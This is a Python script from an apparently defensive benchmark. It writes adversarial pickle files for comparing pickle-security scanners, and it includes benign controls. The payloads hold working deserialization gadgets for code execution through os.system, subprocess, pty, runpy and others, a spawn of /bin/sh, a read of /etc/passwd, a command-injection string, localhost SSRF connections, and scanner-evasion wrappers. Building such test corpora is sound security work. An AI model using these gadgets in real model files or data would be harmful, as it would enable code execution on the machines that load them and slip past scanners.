"""Generate adversarial pickle payloads for GHSA bypass testing.

Creates real .pkl files for each known bypass technique.
These are used by the benchmark to compare tools head-to-head.
"""

from __future__ import annotations
import os
import struct

OUTPUT_DIR = os.path.join(
    os.path.dirname(__file__), "..", "tests", "adversarial_corpus", "ghsa_pickles"
)

# ── Opcode helpers ─────────────────────────────────────────────
PROTO4 = b"\x80\x04"
PROTO5 = b"\x80\x05"
STOP = b"."
REDUCE = b"R"
STACK_GLOBAL = b"\x93"
MEMOIZE = b"\x94"
TUPLE1 = b"\x85"
TUPLE2 = b"\x86"
TUPLE3 = b"\x87"
EMPTY_TUPLE = b")"
EMPTY_LIST = b"]"
EMPTY_DICT = b"}"
MARK = b"("
TUPLE = b"t"
POP = b"0"
NONE = b"N"
NEWTRUE = b"\x88"
OBJ = b"o"
BUILD = b"b"
LIST = b"l"
APPENDS = b"e"
NEWOBJ = b"\x81"


def GLOBAL(module: str, name: str) -> bytes:
    return f"c{module}\n{name}\n".encode()

def SBU(s: str) -> bytes:
    encoded = s.encode("utf-8")
    return b"\x8c" + struct.pack("<B", len(encoded)) + encoded

def SBB(data: bytes) -> bytes:
    return b"C" + struct.pack("<B", len(data)) + data

def STRING(s: str) -> bytes:
    return f"S'{s}'\n".encode()

def PUT(n: int) -> bytes: return f"p{n}\n".encode()
def GET(n: int) -> bytes: return f"g{n}\n".encode()

def BININT1(n: int) -> bytes: return b"K" + struct.pack("<B", n)
def BININT2(n: int) -> bytes: return b"M" + struct.pack("<H", n)

def FRAME(n: int) -> bytes: return b"\x95" + struct.pack("<Q", n)

def INST(module: str, name: str) -> bytes:
    return f"(i{module}\n{name}\n".encode()

def build(*opcodes: bytes) -> bytes:
    return b"".join(opcodes)


PAYLOADS = {
    # ── Classic RCE ──────────────────────────────────────────────
    "os_system.pkl": build(
        GLOBAL("os", "system"),
        STRING("echo pwned"), TUPLE1, REDUCE, STOP,
    ),
    "subprocess_popen.pkl": build(
        PROTO4, SBU("subprocess"), SBU("Popen"), STACK_GLOBAL,
        SBU("echo pwned"), TUPLE1, REDUCE, STOP,
    ),
    "builtins_eval.pkl": build(
        GLOBAL("builtins", "eval"),
        STRING("print('eval')"), TUPLE1, REDUCE, STOP,
    ),

    # ── GHSA bypasses ────────────────────────────────────────────
    "ghsa_pty_spawn.pkl": build(
        PROTO4, FRAME(26),
        SBU("pty"), MEMOIZE, SBU("spawn"), MEMOIZE,
        STACK_GLOBAL, MEMOIZE, SBU("id"), MEMOIZE,
        TUPLE1, MEMOIZE, REDUCE, MEMOIZE, STOP,
    ),
    "ghsa_marshal_types.pkl": build(
        PROTO4, FRAME(0),
        SBU("marshal"), SBU("loads"), STACK_GLOBAL, MEMOIZE,
        SBU("types"), SBU("FunctionType"), STACK_GLOBAL, MEMOIZE,
        STOP,
    ),
    "ghsa_runpy.pkl": build(
        PROTO5, FRAME(46),
        SBU("runpy"), MEMOIZE, SBU("run_path"), MEMOIZE,
        STACK_GLOBAL, MEMOIZE,
        SBU("/tmp/malicious.py"), MEMOIZE,
        TUPLE1, MEMOIZE, REDUCE, MEMOIZE, STOP,
    ),
    "ghsa_cprofile.pkl": build(
        PROTO5, FRAME(58),
        SBU("cProfile"), MEMOIZE, SBU("run"), MEMOIZE,
        STACK_GLOBAL, MEMOIZE,
        SBU("print('RCE')"), MEMOIZE,
        TUPLE1, MEMOIZE, REDUCE, MEMOIZE, STOP,
    ),
    "ghsa_ctypes_cdll.pkl": build(
        PROTO5,
        SBU("ctypes"), MEMOIZE, SBU("CDLL"), MEMOIZE,
        STACK_GLOBAL, MEMOIZE,
        SBU("libc.dylib"), MEMOIZE,
        TUPLE1, MEMOIZE, REDUCE, MEMOIZE, STOP,
    ),
    "ghsa_pydoc_locate.pkl": build(
        PROTO5,
        SBU("pydoc"), MEMOIZE, SBU("locate"), MEMOIZE,
        STACK_GLOBAL, MEMOIZE,
        SBU("os.system"), MEMOIZE,
        TUPLE1, MEMOIZE, REDUCE, MEMOIZE, STOP,
    ),
    "ghsa_importlib.pkl": build(
        PROTO5,
        SBU("importlib"), MEMOIZE, SBU("import_module"), MEMOIZE,
        STACK_GLOBAL, MEMOIZE,
        SBU("os"), MEMOIZE,
        TUPLE1, MEMOIZE, REDUCE, MEMOIZE, STOP,
    ),
    "ghsa_code_interpreter.pkl": build(
        PROTO5,
        SBU("code"), MEMOIZE,
        SBU("InteractiveInterpreter"), MEMOIZE,
        STACK_GLOBAL, MEMOIZE,
        EMPTY_TUPLE, MEMOIZE, REDUCE, MEMOIZE, STOP,
    ),
    "ghsa_multiprocessing.pkl": build(
        PROTO5, FRAME(74),
        SBU("multiprocessing.util"), MEMOIZE,
        SBU("spawnv_passfds"), MEMOIZE,
        STACK_GLOBAL, MEMOIZE,
        SBB(b"/bin/sh"), MEMOIZE,
        EMPTY_LIST, MEMOIZE,
        EMPTY_TUPLE, TUPLE3, MEMOIZE,
        REDUCE, MEMOIZE, STOP,
    ),
    "ghsa_builtins_import_chain.pkl": build(
        GLOBAL("builtins", "__import__"),
        STRING("os"), TUPLE1, REDUCE,
        PUT(0), POP,
        GLOBAL("builtins", "getattr"),
        GET(0), STRING("system"), TUPLE2, REDUCE,
        PUT(1), POP,
        GET(1), STRING("whoami"), TUPLE1, REDUCE,
        STOP,
    ),
    "ghsa_operator_methodcaller.pkl": build(
        PROTO4,
        SBU("_operator"), MEMOIZE, SBU("methodcaller"), MEMOIZE,
        STACK_GLOBAL, MEMOIZE,
        SBU("system"), MEMOIZE, SBU("echo pwned"), MEMOIZE,
        TUPLE2, MEMOIZE, REDUCE, MEMOIZE, STOP,
    ),
    "ghsa_distutils_write.pkl": build(
        PROTO4,
        SBU("distutils.file_util"), SBU("write_file"),
        STACK_GLOBAL,
        SBU("/tmp/evil.txt"),
        MARK, SBU("evil"), LIST,
        TUPLE2, REDUCE, STOP,
    ),
    "ghsa_io_fileio.pkl": build(
        PROTO4,
        SBU("_io"), SBU("FileIO"), STACK_GLOBAL,
        SBU("/etc/passwd"), TUPLE1, REDUCE, STOP,
    ),
    "ghsa_numpy_f2py.pkl": build(
        PROTO4,
        SBU("numpy.f2py.crackfortran"), SBU("getlincoef"),
        STACK_GLOBAL,
        SBU("__import__('os').system('id')"),
        EMPTY_DICT, TUPLE2, REDUCE, STOP,
    ),
    "ghsa_asyncio_subprocess.pkl": build(
        PROTO4, FRAME(81),
        SBU("asyncio.unix_events"), MEMOIZE,
        SBU("_UnixSubprocessTransport._start"), MEMOIZE,
        STACK_GLOBAL, MEMOIZE,
        MARK, EMPTY_DICT, MEMOIZE,
        SBU("whoami"), MEMOIZE,
        NEWTRUE, NONE, NONE, NONE, BININT1(0),
        TUPLE, MEMOIZE, REDUCE, MEMOIZE, STOP,
    ),
    "ghsa_uuid.pkl": build(
        PROTO4,
        SBU("uuid"), SBU("_get_command_stdout"),
        STACK_GLOBAL,
        SBU("echo"), SBU("PROOF"), TUPLE2, REDUCE, STOP,
    ),
    "ghsa_aix_support.pkl": build(
        PROTO4,
        SBU("_aix_support"), SBU("_read_cmd_output"),
        STACK_GLOBAL,
        SBU("echo PROOF"), TUPLE1, REDUCE, STOP,
    ),
    "ghsa_osx_support.pkl": build(
        PROTO4,
        SBU("_osx_support"), SBU("_find_build_tool"),
        STACK_GLOBAL,
        SBU("x; echo INJECTED #"), TUPLE1, REDUCE, STOP,
    ),

    # ── Network SSRF ─────────────────────────────────────────────
    "ssrf_smtplib.pkl": build(
        PROTO4, SBU("smtplib"), SBU("SMTP"), STACK_GLOBAL,
        SBU("127.0.0.1"), BININT2(25), TUPLE2, REDUCE, STOP,
    ),
    "ssrf_ftplib.pkl": build(
        PROTO4, SBU("ftplib"), SBU("FTP"), STACK_GLOBAL,
        SBU("127.0.0.1"), TUPLE1, REDUCE, STOP,
    ),
    "ssrf_poplib.pkl": build(
        PROTO4, SBU("poplib"), SBU("POP3"), STACK_GLOBAL,
        SBU("127.0.0.1"), BININT2(110), TUPLE2, REDUCE, STOP,
    ),
    "ssrf_telnetlib.pkl": build(
        PROTO4, SBU("telnetlib"), SBU("Telnet"), STACK_GLOBAL,
        SBU("127.0.0.1"), BININT2(23), TUPLE2, REDUCE, STOP,
    ),
    "ssrf_nntplib.pkl": build(
        PROTO4, SBU("nntplib"), SBU("NNTP"), STACK_GLOBAL,
        SBU("127.0.0.1"), BININT2(119), TUPLE2, REDUCE, STOP,
    ),

    # ── Evasion patterns ─────────────────────────────────────────
    "evasion_functools_partial.pkl": build(
        PROTO4,
        SBU("functools"), SBU("partial"), STACK_GLOBAL, STOP,
    ),
    "evasion_operator_attrgetter.pkl": build(
        PROTO4,
        SBU("operator"), SBU("attrgetter"), STACK_GLOBAL,
        SBU("system"), TUPLE1, REDUCE, STOP,
    ),
    "evasion_shelve.pkl": build(
        PROTO4,
        SBU("shelve"), SBU("open"), STACK_GLOBAL,
        SBU("/tmp/evil.db"), TUPLE1, REDUCE, STOP,
    ),
    "evasion_pickle_in_pickle.pkl": build(
        PROTO4,
        SBU("_pickle"), SBU("loads"), STACK_GLOBAL,
        SBB(b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00N."),
        TUPLE1, REDUCE, STOP,
    ),
    "evasion_torch_storage.pkl": build(
        PROTO4,
        SBU("torch.storage"), SBU("_load_from_bytes"),
        STACK_GLOBAL, MEMOIZE,
        SBB(b"malicious_pickle_bytes"),
        TUPLE1, REDUCE, STOP,
    ),

    # ── Benign controls ──────────────────────────────────────────
    "benign_ordereddict.pkl": build(
        PROTO4,
        SBU("collections"), SBU("OrderedDict"), STACK_GLOBAL,
        EMPTY_TUPLE, REDUCE, STOP,
    ),
    "benign_numpy_reconstruct.pkl": build(
        PROTO4,
        SBU("numpy.core.multiarray"), SBU("_reconstruct"),
        STACK_GLOBAL, STOP,
    ),
    "benign_torch_storage.pkl": build(
        PROTO4,
        SBU("torch"), SBU("FloatStorage"), STACK_GLOBAL, STOP,
    ),
    "benign_copyreg.pkl": build(
        PROTO4,
        SBU("copyreg"), SBU("_reconstructor"), STACK_GLOBAL, STOP,
    ),
}

def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    for name, data in PAYLOADS.items():
        path = os.path.join(OUTPUT_DIR, name)
        with open(path, "wb") as f:
            f.write(data)
    print(f"Generated {len(PAYLOADS)} payloads in {OUTPUT_DIR}")


if __name__ == "__main__":
    main()
